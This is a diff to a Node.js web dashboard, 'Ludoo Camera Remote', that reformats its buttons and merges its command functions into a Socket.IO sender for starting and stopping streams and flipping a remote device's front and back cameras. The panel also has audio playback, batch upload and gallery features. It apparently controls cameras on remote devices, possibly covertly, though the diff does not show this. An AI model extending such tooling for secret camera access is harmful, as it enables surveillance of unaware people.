-        <div class="button-group"><button class="btn btn-start" id="startBtn">▶ START</button><button class="btn btn-stop" id="stopBtn">⏹ STOP</button><button class="btn btn-front" id="frontBtn">📷 FRONT</button><button class="btn btn-back active-cam" id="backBtn">📷 BACK</button></div>
+        <div class="button-group">
+            <button class="btn btn-start" id="startBtn">▶ START</button>
+            <button class="btn btn-stop" id="stopBtn">⏹ STOP</button>
+            <button class="btn btn-front" id="frontBtn">📷 FRONT</button>
+            <button class="btn btn-back active-cam" id="backBtn">📷 BACK</button>
+        </div>
         <div class="section-title">📐 QUALITY</div>
-        <div class="quality-grid"><button class="quality-btn" data-quality="120">120p</button><button class="quality-btn" data-quality="140">140p</button><button class="quality-btn active" data-quality="240">240p</button><button class="quality-btn" data-quality="360">360p</button></div>
-        <div class="fps-control"><div class="section-title">⚡ FPS</div><input type="range" id="fpsSlider" min="5" max="30" value="15" step="1" class="fps-slider"><div class="fps-value" id="fpsLabel">15 FPS (Recommended)</div></div>
+        <div class="quality-grid">
+            <button class="quality-btn" data-quality="120">120p</button>
+            <button class="quality-btn" data-quality="140">140p</button>
+            <button class="quality-btn active" data-quality="240">240p</button>
+            <button class="quality-btn" data-quality="360">360p</button>
+        </div>
+        <div class="fps-control">
+            <div class="section-title">⚡ FPS</div>
+            <input type="range" id="fpsSlider" min="5" max="30" value="15" step="1" class="fps-slider">
+            <div class="fps-value" id="fpsLabel">15 FPS (Recommended)</div>
+        </div>
     </div>
     <div class="voice-card">
         <div class="section-title">🎤 PCM AUDIO PLAYER</div>
@@ -2124,6 +2115,21 @@ app.get('/', requireAuth, (req, res) => {
         updateFrame('data:image/jpeg;base64,' + data.image);
     });
 
+    // ✅ Socket.IO command send
+    function sendCommandWS(command, value) {
+        if (!selectedDeviceId) { alert('Select a device first'); return; }
+        if (wsReady) {
+            socket.emit('send_command', { deviceId: selectedDeviceId, command, value: value ?? null });
+        } else {
+            // Fallback to HTTP
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId: selectedDeviceId, command, value: value ?? null })
+            }).catch(() => {});
+        }
+    }
+
     let selectedDeviceId = null, currentDevices = [], isStreaming = false, wasStreaming = false;
     let userStoppedStream = false;
     let frameCount = 0, lastFpsUpdate = Date.now(), framePollTimer = null, lastFrameTs = 0;
@@ -2179,23 +2185,10 @@ app.get('/', requireAuth, (req, res) => {
     }
     function stopFramePoll() { if (framePollTimer) { clearInterval(framePollTimer); framePollTimer = null; } }
 
-    function sendCommand(command, value) {
-        if (!selectedDeviceId) { alert('Select a device first'); return; }
-        if (wsReady) {
-            socket.emit('send_command', { deviceId: selectedDeviceId, command, value: value ?? null });
-        } else {
-            fetch('/api/command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ deviceId: selectedDeviceId, command, value: value ?? null })
-            }).catch(() => {});
-        }
-    }
-
     document.getElementById('startBtn').onclick = () => {
         if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
         userStoppedStream = false;
-        sendCommand('start');
+        sendCommandWS('start');
         isStreaming = true; wasStreaming = false;
         disconnectedOverlay.classList.remove('show');
         startFramePoll();
@@ -2203,7 +2196,7 @@ app.get('/', requireAuth, (req, res) => {
     document.getElementById('stopBtn').onclick = () => {
         if (!selectedDeviceId) return;
         userStoppedStream = true;
-        sendCommand('stop');
+        sendCommandWS('stop');
         isStreaming = false; wasStreaming = false;
         stopFramePoll();
         video.src = ''; video.style.display = 'none';
@@ -2220,36 +2213,24 @@ app.get('/', requireAuth, (req, res) => {
     }
     document.getElementById('frontBtn').onclick = () => {
         if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
-        sendCameraFlip('front');
+        sendCommandWS('flip', 'front');
     };
     document.getElementById('backBtn').onclick = () => {
         if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
-        sendCameraFlip('back');
+        sendCommandWS('flip', 'back');
     };
-    function sendCameraFlip(camera) {
-        setCameraBtn(camera);
-        if (wsReady) {
-            socket.emit('send_command', { deviceId: selectedDeviceId, command: 'flip', value: camera });
-        } else {
-            fetch('/api/flip', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ deviceId: selectedDeviceId, camera })
-            }).catch(() => {});
-        }
-    }
 
     document.querySelectorAll('.quality-btn').forEach(btn => {
         btn.onclick = () => {
             document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
             btn.classList.add('active');
-            sendCommand('quality', parseInt(btn.dataset.quality));
+            sendCommandWS('quality', parseInt(btn.dataset.quality));
         };
     });
     fpsSlider.oninput = () => {
         const fps = parseInt(fpsSlider.value);
         fpsLabel.textContent = fps + ' FPS' + (fps === 15 ? ' (Recommended)' : '');
-        sendCommand('fps', fps);
+        sendCommandWS('fps', fps);
         if (isStreaming) startFramePoll();
     };
 
@@ -2343,7 +2324,7 @@ app.get('/', requireAuth, (req, res) => {
 
     function selectDevice(deviceId) {
         if (selectedDeviceId === deviceId) return;
-        if (isStreaming) { sendCommand('stop'); stopFramePoll(); }
+        if (isStreaming) { sendCommandWS('stop'); stopFramePoll(); }
         selectedDeviceId = deviceId;
         wasStreaming = false; isStreaming = false; userStoppedStream = false;
         lastFrameTs = 0;
@@ -2389,7 +2370,7 @@ app.get('/', requireAuth, (req, res) => {
         if (sel && !sel.isConnected && isStreaming) {
             wasStreaming = true; stopFramePoll(); disconnectedOverlay.classList.add('show'); fpsCountSpan.textContent = '0';
         } else if (sel && sel.isConnected && wasStreaming && !isStreaming && !userStoppedStream) {
-            wasStreaming = false; isStreaming = true; disconnectedOverlay.classList.remove('show'); sendCommand('start'); startFramePoll();
+            wasStreaming = false; isStreaming = true; disconnectedOverlay.classList.remove('show'); sendCommandWS('start'); startFramePoll();
         }
     }
 
@@ -2569,14 +2550,15 @@ const PORT = process.env.PORT || 5000;
 server.listen(PORT, '0.0.0.0', () => {
     console.log('');
     console.log('═══════════════════════════════════════════════════');
-    console.log('✅  Ludoo Camera Remote  —  WebSocket + HTTP Mode');
+    console.log('✅  Ludoo Camera Remote  —  Socket.IO + HTTP Mode');
     console.log('═══════════════════════════════════════════════════');
     console.log('🌐  Web UI       : http://localhost:' + PORT);
     console.log('🔑  Password     : [set via DASHBOARD_PASSWORD env var]');
     console.log('📦  Batch Upload : POST /api/batch');
-    console.log('⚡  WebSocket    : Stream Only');
-    console.log('📡  Commands     : HTTP Polling + WS');
+    console.log('⚡  Socket.IO    : Commands via WebSocket (0 KB idle)');
+    console.log('📡  HTTP         : Fallback for data transfer');
     console.log('📸  Gallery      : ✅ ENABLED (Separate Page)');
+    console.log('📊  Status API   : GET /api/status/:deviceId');
     console.log('═══════════════════════════════════════════════════');
     console.log('');
 });
